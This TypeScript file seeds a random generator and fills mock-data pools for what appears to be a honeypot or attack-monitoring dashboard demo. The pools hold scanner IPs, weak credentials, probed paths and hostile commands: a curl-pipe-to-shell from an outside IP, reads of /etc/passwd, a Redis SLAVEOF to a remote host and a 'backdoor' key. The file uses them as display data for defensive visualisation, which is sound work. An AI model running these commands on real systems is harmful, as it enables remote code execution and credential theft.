/** 固定种子的伪随机工具：保证两套配色下看到的数据完全一致，便于对比视觉。 */
export type Rng = () => number;

export function createRng(seed: number): Rng {
  let state = seed >>> 0;

  return () => {
    state = (state + 0x6d2b79f5) >>> 0;
    let t = state;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);

    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

export function pick<T>(rng: Rng, list: readonly T[]): T {
  return list[Math.floor(rng() * list.length) % list.length];
}

export function intBetween(rng: Rng, min: number, max: number): number {
  return min + Math.floor(rng() * (max - min + 1));
}

export function pad2(value: number): string {
  return value < 10 ? `0${value}` : String(value);
}

/** 与 event.Event.Timestamp 完全一致的格式 */
export function formatTimestamp(date: Date): string {
  return [
    `${date.getFullYear()}-${pad2(date.getMonth() + 1)}-${pad2(date.getDate())}`,
    `${pad2(date.getHours())}:${pad2(date.getMinutes())}:${pad2(date.getSeconds())}`,
  ].join(' ');
}

export function formatClock(date: Date): string {
  return `${pad2(date.getHours())}:${pad2(date.getMinutes())}:${pad2(date.getSeconds())}`;
}

/** 扫描器常见来源，带归属地用于 Top 排行展示 */
export const ATTACKER_POOL: ReadonlyArray<{ ip: string; location: string }> = [
  { ip: '45.155.205.233', location: '荷兰 · 阿姆斯特丹' },
  { ip: '185.220.101.47', location: '德国 · 法兰克福' },
  { ip: '89.248.165.74', location: '荷兰 · 阿姆斯特丹' },
  { ip: '218.92.0.112', location: '中国 · 江苏' },
  { ip: '141.98.10.63', location: '立陶宛 · 维尔纽斯' },
  { ip: '193.32.162.14', location: '瑞典 · 斯德哥尔摩' },
  { ip: '62.204.41.83', location: '罗马尼亚 · 布加勒斯特' },
  { ip: '103.152.220.19', location: '中国香港' },
  { ip: '80.94.95.6', location: '保加利亚 · 索非亚' },
  { ip: '167.94.138.51', location: '美国 · 密歇根' },
  { ip: '121.18.238.66', location: '中国 · 河北' },
  { ip: '5.188.206.18', location: '俄罗斯 · 莫斯科' },
];

export const USERNAME_POOL: readonly string[] = [
  'root',
  'admin',
  'ubuntu',
  'test',
  'oracle',
  'postgres',
  'www-data',
  'user',
  'guest',
  'pi',
];

export const PASSWORD_POOL: readonly string[] = [
  '123456',
  'root',
  'admin',
  'P@ssw0rd',
  'qwerty',
  'password',
  '12345678',
  'toor',
  'admin@123',
  '1qaz2wsx',
];

export const HTTP_PATH_POOL: readonly string[] = [
  '/',
  '/index.php',
  '/wp-login.php',
  '/phpmyadmin/index.php',
  '/.env',
  '/config.json',
  '/api/v1/pods',
  '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
  '/actuator/env',
  '/cgi-bin/luci',
  '/HNAP1/',
  '/console/login/LoginForm.jsp',
];

export const HTTP_UA_POOL: readonly string[] = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36',
  'Mozilla/5.0 zgrab/0.x',
  'python-requests/2.31.0',
  'curl/8.5.0',
  'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
  'Go-http-client/1.1',
];

export const DOCKER_PATH_POOL: readonly string[] = [
  '/version',
  '/info',
  '/containers/json?all=1',
  '/images/json',
  '/networks',
  '/containers/create',
  '/volumes',
  '/system/df',
  '/events',
];

export const SHELL_COMMAND_POOL: readonly string[] = [
  'uname -a',
  'cat /etc/passwd',
  'id',
  'w',
  'ps -ef',
  'ls -la /',
  'cat /proc/cpuinfo',
  'curl http://45.155.205.233/x.sh | sh',
  'rm -rf /tmp/.x',
  'crontab -l',
];

export const REDIS_COMMAND_POOL: readonly string[] = [
  'PING',
  'INFO',
  'CONFIG GET *',
  'SLAVEOF 45.155.205.233 6379',
  'MODULE LIST',
  'KEYS *',
  'SET backdoor 1',
];

export const MYSQL_QUERY_POOL: readonly string[] = [
  'SELECT @@version',
  'SELECT user()',
  'SHOW DATABASES',
  "SELECT load_file('/etc/passwd')",
  'SHOW VARIABLES LIKE "%version%"',
];
